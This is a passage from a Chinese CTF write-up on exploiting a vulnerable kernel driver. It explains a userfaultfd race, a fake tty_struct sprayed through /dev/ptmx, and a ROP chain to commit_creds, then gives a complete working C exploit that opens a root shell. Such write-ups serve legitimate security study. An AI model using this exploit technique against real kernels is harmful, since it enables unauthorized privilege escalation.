class="type">long</span>*)data);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] ptr: 0x%llx\n&quot;</span>, ptr);</span><br><span class="line"><span class="type">char</span> a[<span class="number">0x20</span>] = &#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>&#125;;</span><br><span class="line">write(fd, a, <span class="number">0x20</span>);</span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241014173838215.png"
                      alt="image-20241014173838215"
                ><figcaption>image-20241014173838215</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241014173846330.png"
                      alt="image-20241014173846330"
                ><figcaption>image-20241014173846330</figcaption></figure></p>
<p>可以看到我们确实可以直接执行申请堆块，堆块地址也拿到了，并且也成功写入内容了，说明检查已经绕过了；</p>
<h2 id="Step-7"><a href="#Step-7" class="headerlink" title="Step.7"></a>Step.7</h2><p>这一部分就是最重要的部分了，注册<code>userfaultfd</code>来处理缺页错误；</p>
<p>那么从哪里来的缺页错误呢，这是我们需要解决的一个问题：</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241014175324437.png"
                      alt="image-20241014175324437"
                ><figcaption>image-20241014175324437</figcaption></figure></p>
<p>利用我们write函数的<code>copy_from_user</code>，假如我们传入的<code>a2</code>是一块<code>mmap</code>映射出来的未初始化的一块区域，此时就会发生缺页错误，此时<code>copy_from_user</code>就会暂停执行，在暂停时，我们再打开另一个线程将ptr释放，将其他结构申请到这里，然后恢复执行<code>copy_from_user</code>时，此时我们的<code>ptr</code>指向的就是我们申请的其他结构体，在这道题我们用的是<code>tty_struct</code>，然后就可以对tty进行修改了；</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Handler</span><span class="params">(<span class="type">int</span> uffd)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* faketty = (<span class="type">unsigned</span> <span class="type">long</span>*)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pf</span>;</span></span><br><span class="line">    pf.fd = uffd;</span><br><span class="line">    pf.events = POLLIN;</span><br><span class="line">    poll(&amp;pf, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">	......</span><br><span class="line">    uc.src = (<span class="type">unsigned</span> <span class="type">long</span>)faketty;<span class="comment">//写入的内容页，这里是我们自己写的faketty</span></span><br><span class="line">    uc.dst = msg.arg.pagefault.address &amp; ~(getpagesize() - <span class="number">1</span>);</span><br><span class="line">    uc.len = getpagesize();</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>* page;</span><br><span class="line"><span class="type">void</span> <span class="title function_">userfaultfd</span><span class="params">()</span>&#123;</span><br><span class="line">    page = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    ur.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)page;</span><br><span class="line">    ur.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ioctl(uffd, UFFDIO_REGISTER, &amp;ur);</span><br><span class="line">    <span class="type">pthread_t</span> pt;</span><br><span class="line">    pthread_create(&amp;pt, <span class="literal">NULL</span>, (<span class="type">void</span>*(*)(<span class="type">void</span>*))Handler, (<span class="type">void</span>*)uffd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这是目前的注册<code>userfaultfd</code>的函数，<code>handler</code>在后面继续写，这里大致就算是一个模板了，如果想了解这里面结构体的各个成员可以看我前言参考文章中的第三篇，讲解的比较详细，这里主要是为了做题就不赘述了；</p>
<h2 id="Step-8"><a href="#Step-8" class="headerlink" title="Step.8"></a>Step.8</h2><p>写rop之前我们需要了解下我们劫持tty结构体是为了什么，如何利用这个结构体：</p>
<p>当用户打开ptmx驱动时，会分配一个<code>tty_struct</code>结构，源码放在了文章最后；</p>
<p>其中有一个<code>const struct tty_operations *ops;</code>，它是一个<code>tty_operations</code>指针，<code>tty_operations</code>结构体里面是一些对驱动操作的函数指针；</p>
<p>此时可以想到我们在做用户态高版本堆利用时，会伪造vtable来利用IO进行攻击，在这里也是一样的，我们伪造一个<code>tty_struct</code>，使里面指向伪造的<code>tty_operations</code>结构体，再对驱动执行相应的函数，而此时该函数指向的是我们写的ROP链，就可以达到一个控制程序执行流程的目的。</p>
<h2 id="Step-9"><a href="#Step-9" class="headerlink" title="Step.9"></a>Step.9</h2><p>该题目的gadget可能比较麻烦，没有找到特别合适的，只能用一些带着其他指令的gadget，稍微调试一下便好；</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Handler</span><span class="params">(<span class="type">int</span> uffd)</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> commit_creds = kernel_base + <span class="number">0x97d00</span>;</span><br><span class="line">    <span class="type">size_t</span> prepare_kernel_cred = kernel_base + <span class="number">0x98140</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rop_31_to_rsp = kernel_base + <span class="number">0x572fb3</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rdi = kernel_base + <span class="number">0x003e98</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rbx = kernel_base + <span class="number">0x35a6</span>;</span><br><span class="line">    <span class="type">size_t</span> mov_rdi_rax_test_rbx_rbx_jg_0x34f900_mov_rax_rdi_pop_rbx = kernel_base + <span class="number">0x34e90e</span>;</span><br><span class="line">    <span class="type">size_t</span> swapgs = kernel_base + <span class="number">0x5c8f0</span>;</span><br><span class="line">    <span class="type">size_t</span> iretq = kernel_base + <span class="number">0x32b42</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* faketty = (<span class="type">unsigned</span> <span class="type">long</span>*)mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pf</span>;</span></span><br><span class="line">        pf.fd = uffd;</span><br><span class="line">        pf.events = POLLIN;</span><br><span class="line">        poll(&amp;pf, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        read(&amp;uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span>(msg.event &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        faketty[<span class="number">0</span>] = TTY_STRUCT_MAGIC;</span><br><span class="line">        faketty[<span class="number">2</span>] = ptr;</span><br><span class="line">        faketty[<span class="number">3</span>] = ptr;</span><br><span class="line">        *(<span class="type">long</span>*)(((<span class="type">char</span>*)faketty) + <span class="number">0x31</span>) = ptr+<span class="number">0x100</span>;</span><br><span class="line">        faketty[<span class="number">12</span>] = pop_rop_31_to_rsp;<span class="comment">//tty_operations[12] = ioctl</span></span><br><span class="line">        faketty[idx++] = pop_rdi;</span><br><span class="line">        faketty[idx++] = <span class="number">0</span>;</span><br><span class="line">        faketty[idx++] = prepare_kernel_cred;</span><br><span class="line">        faketty[idx++] = pop_rbx;</span><br><span class="line">        faketty[idx++] = <span class="number">0</span>;</span><br><span class="line">        faketty[idx++] = mov_rdi_rax_test_rbx_rbx_jg_0x34f900_mov_rax_rdi_pop_rbx;</span><br><span class="line">        faketty[idx++] = <span class="number">0</span>;</span><br><span class="line">        faketty[idx++] = commit_creds;</span><br><span class="line">        faketty[idx++] = swapgs;</span><br><span class="line">        faketty[idx++] = iretq;</span><br><span class="line">        faketty[idx++] = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shell;</span><br><span class="line">        faketty[idx++] = user_cs;</span><br><span class="line">        faketty[idx++] = user_rflags;</span><br><span class="line">        faketty[idx++] = user_rsp;</span><br><span class="line">        faketty[idx++] = user_ss;</span><br><span class="line">        *(<span class="type">long</span>*)&amp;checkbuf[<span class="number">0x58</span><span class="number">-0x30</span>] = <span class="number">0</span>;</span><br><span class="line">        ioctl(fd, <span class="number">0xFFF1</span>, checkbuf);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x50</span>; i++)&#123;</span><br><span class="line">            ptmx[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        &#125;</span><br><span class="line">        uc.src = (<span class="type">unsigned</span> <span class="type">long</span>)faketty;</span><br><span class="line">        uc.dst = msg.arg.pagefault.address &amp; ~(getpagesize() - <span class="number">1</span>);</span><br><span class="line">        uc.len = getpagesize();</span><br><span class="line">        uc.mode = <span class="number">0</span>;</span><br><span class="line">        uc.copy = <span class="number">0</span>;</span><br><span class="line">        ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_MAGIC 0x0000000100005401</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; hex(base - libc.sym[&#x27;commit_creds&#x27;])</span></span><br><span class="line"><span class="comment">&#x27;-0x97d00&#x27;</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; hex(base - libc.sym[&#x27;prepare_kernel_cred&#x27;])</span></span><br><span class="line"><span class="comment">&#x27;-0x98140&#x27;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">0x572fb3: push qword ptr [rcx + rdx + 0x31]; rcr byte ptr [rbx + 0x5d], 0x41; pop rsp; ret; </span></span><br><span class="line"><span class="comment">0x003e98: pop rdi; ret; </span></span><br><span class="line"><span class="comment">0x0035a6: pop rbx; ret;</span></span><br><span class="line"><span class="comment">0x34e90e: mov rdi, rax; test rbx, rbx; jg 0x34f900; mov rax, rdi; pop rbx; ret; </span></span><br><span class="line"><span class="comment">0x5c8f0: swapgs; ret; </span></span><br><span class="line"><span class="comment">0x32b42: iretq; ret; </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">size_t</span> kernel_base;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> check_buf[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">char</span> data[<span class="number">0x400</span>];</span><br><span class="line"><span class="type">int</span> ptmx[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">long</span> ptr;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_rsp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        __asm__(<span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov user_rsp, rsp;&quot;</span></span><br><span class="line">                <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">                <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">                <span class="string">&quot;.att_syntax;&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m[+]save status successfully\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> data[<span class="number">0x400</span>],checkbuf[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">int</span> ptmx[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">long</span> ptr;</span><br><span class="line"><span class="type">size_t</span> kernel_base;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Handler</span><span class="params">(<span class="type">int</span> uffd)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> commit_creds = kernel_base + <span class="number">0x97d00</span>;</span><br><span class="line">    <span class="type">size_t</span> prepare_kernel_cred = kernel_base + <span class="number">0x98140</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rop_31_to_rsp = kernel_base + <span class="number">0x572fb3</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rdi = kernel_base + <span class="number">0x003e98</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rbx = kernel_base + <span class="number">0x35a6</span>;</span><br><span class="line">    <span class="type">size_t</span> mov_rdi_rax_test_rbx_rbx_jg_0x34f900_mov_rax_rdi_pop_rbx = kernel_base + <span class="number">0x34e90e</span>;</span><br><span class="line">    <span class="type">size_t</span> swapgs = kernel_base + <span class="number">0x5c8f0</span>;</span><br><span class="line">    <span class="type">size_t</span> iretq = kernel_base + <span class="number">0x32b42</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span> =</span> &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* faketty = (<span class="type">unsigned</span> <span class="type">long</span>*)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pf</span> =</span> &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        pf.fd = uffd;</span><br><span class="line">        pf.events = POLLIN;</span><br><span class="line">        poll(&amp;pf, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (msg.event &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        faketty[<span class="number">0</span>] = TTY_STRUCT_MAGIC;</span><br><span class="line">        faketty[<span class="number">2</span>] = ptr;</span><br><span class="line">        faketty[<span class="number">3</span>] = ptr;</span><br><span class="line">        *(<span class="type">long</span>*)(((<span class="type">char</span>*)faketty) + <span class="number">0x31</span>) = ptr+<span class="number">0x100</span>;</span><br><span class="line">        faketty[<span class="number">12</span>] = pop_rop_31_to_rsp;</span><br><span class="line">        faketty[idx++] = pop_rdi;</span><br><span class="line">        faketty[idx++] = <span class="number">0</span>;</span><br><span class="line">        faketty[idx++] = prepare_kernel_cred;</span><br><span class="line">        faketty[idx++] = pop_rbx;</span><br><span class="line">        faketty[idx++] = <span class="number">0</span>;</span><br><span class="line">        faketty[idx++] = mov_rdi_rax_test_rbx_rbx_jg_0x34f900_mov_rax_rdi_pop_rbx;</span><br><span class="line">        faketty[idx++] = <span class="number">0</span>;</span><br><span class="line">        faketty[idx++] = commit_creds;</span><br><span class="line">        faketty[idx++] = swapgs;</span><br><span class="line">        faketty[idx++] = iretq;</span><br><span class="line">        faketty[idx++] = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shell;</span><br><span class="line">        faketty[idx++] = user_cs;</span><br><span class="line">        faketty[idx++] = user_rflags;</span><br><span class="line">        faketty[idx++] = user_rsp;</span><br><span class="line">        faketty[idx++] = user_ss;</span><br><span class="line">        *(<span class="type">long</span>*)&amp;checkbuf[<span class="number">0x58</span> - <span class="number">0x30</span>] = <span class="number">0</span>;</span><br><span class="line">        ioctl(fd, <span class="number">0xFFF1</span>, checkbuf);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x50</span>; i++) &#123;</span><br><span class="line">            ptmx[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        &#125;</span><br><span class="line">        uc.src = (<span class="type">unsigned</span> <span class="type">long</span>)faketty;</span><br><span class="line">        uc.dst = msg.arg.pagefault.address &amp; ~(getpagesize() - <span class="number">1</span>);</span><br><span class="line">        uc.len = getpagesize();</span><br><span class="line">        uc.mode = <span class="number">0</span>;</span><br><span class="line">        uc.copy = <span class="number">0</span>;</span><br><span class="line">        ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>* page;</span><br><span class="line"><span class="type">void</span> <span class="title function_">userfaultfd</span><span class="params">()</span>&#123;</span><br><span class="line">    page = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span> =</span> &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span> =</span> &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    ur.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)page;</span><br><span class="line">    ur.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_REGISTER, &amp;ur);</span><br><span class="line">    <span class="type">pthread_t</span> pt;</span><br><span class="line">    pthread_create(&amp;pt, <span class="literal">NULL</span>, (<span class="type">void</span>* (*)(<span class="type">void</span>*))Handler, (<span class="type">void</span>*)uffd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status();</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ksctf&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="comment">//leak kernelbase</span></span><br><span class="line">    <span class="type">int</span> note = open(<span class="string">&quot;/sys/kernel/notes&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="type">char</span> tmp[<span class="number">0x100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    read(note, tmp, <span class="number">0x100</span>);</span><br><span class="line">    kernel_base = *(<span class="type">long</span>*)(&amp;tmp[<span class="number">0x9c</span>]) - <span class="number">0x2000</span>;</span><br><span class="line">    checkbuf[<span class="number">0x20</span>] = <span class="number">1</span>;</span><br><span class="line">    *(<span class="type">long</span>*)&amp;checkbuf[<span class="number">0x28</span>] = (<span class="type">long</span>)data;</span><br><span class="line">    <span class="comment">//userfauld</span></span><br><span class="line">    userfaultfd();</span><br><span class="line">    ioctl(fd, <span class="number">0xFFF0</span>, checkbuf);</span><br><span class="line">    ptr = *(<span class="type">long</span>*)data;</span><br><span class="line">    write(fd, page, <span class="number">0x2e0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x50</span>; i++) &#123;</span><br><span class="line">         ioctl(ptmx[i], <span class="number">0</span>, ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><h2 id="tty-struct"><a href="#tty-struct" class="headerlink" title="tty_struct"></a>tty_struct</h2><p>位于<code>/include/linux/tty.h</code></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">	<span class="type">int</span> index;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">	<span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">	<span class="type">int</span> count;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> receive_room;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="type">spinlock_t</span> lock;</span><br><span class="line">		<span class="type">bool</span> stopped;</span><br><span class="line">		<span class="type">bool</span> tco_stopped;</span><br><span class="line">	&#125; flow;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">		<span class="type">spinlock_t</span> lock;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">char</span> pktstatus;</span><br><span class="line">		<span class="type">bool</span> packet;</span><br><span class="line">	&#125; ctrl;</span><br><span class="line"></span><br><span class="line">	<span class="type">bool</span> hw_stopped;</span><br><span class="line">	<span class="type">bool</span> closing;</span><br><span class="line">	<span class="type">int</span> flow_change;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">	<span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line">	<span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">	<span class="type">void</span> *disc_data;</span><br><span class="line">	<span class="type">void</span> *driver_data;</span><br><span class="line">	<span class="type">spinlock_t</span> files_lock;</span><br><span class="line">	<span class="type">int</span> write_cnt;</span><br><span class="line">	u8 *write_buf;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure></div>

<h2 id="tty-operations"><a href="#tty-operations" class="headerlink" title="tty_operations"></a>tty_operations</h2><p>位于<code>/include/linux/tty_driver.h</code></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">			<span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">	<span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">int</span>  (*open)(<span 